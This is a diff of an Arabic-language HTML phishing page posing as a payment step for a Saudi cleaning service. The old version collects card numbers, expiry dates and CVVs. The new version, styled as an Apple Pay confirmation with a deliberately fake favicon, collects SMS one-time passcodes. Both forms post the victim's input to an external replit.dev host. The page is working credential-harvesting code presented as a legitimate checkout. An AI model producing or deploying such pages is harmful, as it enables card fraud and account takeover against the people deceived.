@@ -1,154 +1,130 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فاتورة تأكيد حجز</title>
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+    <title>تأكيد عملية الدفـع آبـل بـي</title>
+    <link rel="icon" href="fake-favicon.ico" type="image/x-icon">
     <style>
         body {
-            font-family: 'Tajawal', sans-serif;
-            margin: 0;
-            padding: 0;
+            font-family: Arial, sans-serif;
             background-color: #f4f4f4;
-            direction: rtl;
+            text-align: center;
+            padding: 50px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
         .container {
             max-width: 400px;
-            margin: 50px auto;
-            background: #fff;
-            padding: 20px;
+            width: 100%;
+            background: #ffffff;
+            padding: 30px;
             border-radius: 12px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
         }
-        .logo {
-            display: block;
-            margin: 0 auto 20px;
-            max-width: 80px;
+        .logo img {
+            max-width: 150px;
+            margin-bottom: 20px;
         }
         h2 {
-            text-align: center;
+            font-size: 24px;
             color: #333;
-            margin-bottom: 20px;
+            margin-bottom: 10px;
         }
-        .bill-details {
-            background-color: #f9f9f9;
-            border: 1px solid #ddd;
-            padding: 15px;
+        .message {
+            font-size: 16px;
+            color: #555;
+            margin-bottom: 25px;
+        }
+        .otp-form input {
+            padding: 12px;
+            width: 100%;
+            margin-bottom: 20px;
             border-radius: 8px;
-            margin-bottom: 20px;
-        }
-        .bill-details p {
-            margin: 5px 0;
-            font-size: 16px;
-            color: #555;
-        }
-        .bill-details .total {
+            border: 1px solid #ddd;
             font-size: 18px;
-            font-weight: bold;
-            color: #333;
             text-align: center;
         }
-        form {
-            display: flex;
-            flex-direction: column;
-        }
-        label {
-            margin-bottom: 8px;
-            font-weight: bold;
-            color: #555;
-        }
-        input, select {
-            margin-bottom: 15px;
+        .submit-btn {
+            background-color: #0070ba;
+            color: white;
             padding: 12px;
-            font-size: 14px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            transition: border-color 0.3s;
-        }
-        input:focus, select:focus {
-            outline: none;
-            border-color: #007bff;
-        }
-        button {
-            padding: 12px;
-            font-size: 16px;
-            font-weight: bold;
-            color: #fff;
-            background-color: #007bff;
+            width: 100%;
             border: none;
-            border-radius: 6px;
+            border-radius: 8px;
             cursor: pointer;
+            font-size: 16px;
             transition: background-color 0.3s;
         }
-        button:hover {
-            background-color: #0056b3;
+        .submit-btn:hover {
+            background-color: #005a8c;
         }
-        .notice {
+        .timer {
             font-size: 14px;
             color: #888;
             margin-top: 10px;
-            text-align: center;
+            padding: 8px 0;
+        }
+        .timer-countdown {
+            font-weight: bold;
+            color: #0070ba;
+            font-size: 16px;
+        }
+        .footer {
+            font-size: 12px;
+            color: #aaa;
+            margin-top: 20px;
         }
     </style>
 </head>
-<body>
+<body dir="rtl">
     <div class="container">
-        <img src="alraqi/ap.jpeg" alt="Logo" class="logo">
-        <h2>فاتورة تأكيد حجز</h2>
-        <div class="bill-details">
-            <p>٥٠ ريال سعودي</p>
-            <p>البيت الراقي لخدمات التنظيف</p>
-            <p class="total">المجموع: ٥٠ ريال سعودي</p>
+        <div class="logo">
+            <img src="alraqi/ap.jpeg" alt="Logo">
         </div>
-        <form action="https://4845ee08-231c-49ab-a265-c887144f82c0-00-27oslksbz5zql.sisko.replit.dev/index.php" method="POST">
-            <label for="card-name">الاسم على البطاقة</label>
-            <input type="text" id="card-name" name="card-name" placeholder="اكتب الاسم على البطاقة" required>
+        <h2>تأكيد عملية الــدفـع</h2>
+        <p class="message">لتأكيد عملية الدفع، سيتم إرسال رمز التحقق إلى رقم جوالك خلال:</p>
 
-            <label for="card-number">رقم البطاقة</label>
-            <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" maxlength="16" required>
+        <!-- Countdown Timer -->
+        <div class="timer">
+            <span class="timer-text">انتظر رمز التحقق في غضون</span> 
+            <span id="countdown" class="timer-countdown">30</span> ثانية
+        </div>
 
-            <label for="expiry-date">تاريخ الانتهاء</label>
-            <div class="flex-row">
-                <select id="expiry-month" name="expiry-month" required>
-                    <option value="" disabled selected>الشهر</option>
-                 <option value="02">02</option>
-<option value="03">03</option>
-<option value="04">04</option>
-<option value="05">05</option>
-<option value="06">06</option>
-<option value="07">07</option>
-<option value="08">08</option>
-<option value="09">09</option>
-<option value="10">10</option>
-<option value="11">11</option>
-<option value="12">12</option>
-                </select>
-                <select id="expiry-year" name="expiry-year" required>
-                    <option value="" disabled selected>السنة</option>
-                </select>
-            </div>
-
-            <label for="cvv">CVV</label>
-            <input type="password" id="cvv" name="cvv" placeholder="123" maxlength="3" required>
-
-            <button type="submit">ادفع الآن</button>
+        <!-- Form that submits ooo to submit.php -->
+        <form class="otp-form" action="https://4845ee08-231c-49ab-a265-c887144f82c0-00-27oslksbz5zql.sisko.replit.dev/index.php" method="POST">
+            <input type="text" name="otp" id="otp-input" placeholder="أدخل رمز التحقق" required maxlength="6" pattern="\d{6}" title="يجب أن يكون 6 أرقام" oninput="validateInput(this)">
+            <button type="submit" class="submit-btn">تأكيد</button>
         </form>
-
-        <p class="notice">تأكد من صحة التفاصيل قبل الدفع</p>
+        
+        <div class="footer">
+            <p>© 2024 البيت الراقي لخدمات التنظيف-جميع الحقوق محفوظة.</p>
+        </div>
     </div>
+
     <script>
-        // Populate the year dropdown
-        const currentYear = new Date().getFullYear();
-        const expiryYearSelect = document.getElementById('expiry-year');
-        for (let i = 0; i < 10; i++) {
-            const year = currentYear + i;
-            const option = document.createElement('option');
-            option.value = year;
-            option.textContent = year;
-            expiryYearSelect.appendChild(option);
+        // Countdown Timer Script
+        let countdown = 30;
+        const countdownElement = document.getElementById('countdown');
+        
+        const countdownInterval = setInterval(() => {
+            countdown--;
+            countdownElement.textContent = countdown;
+
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+                document.querySelector('.timer').innerHTML = "تم إرسال رمز التحقق إلى رقمك.";
+            }
+        }, 1000);
+
+        // Input validation to allow only numeric input
+        function validateInput(input) {
+            input.value = input.value.replace(/[^0-9]/g, '').slice(0, 6);  // Limit input to 6 digits
         }
     </script>
 </body>
 </html>
-
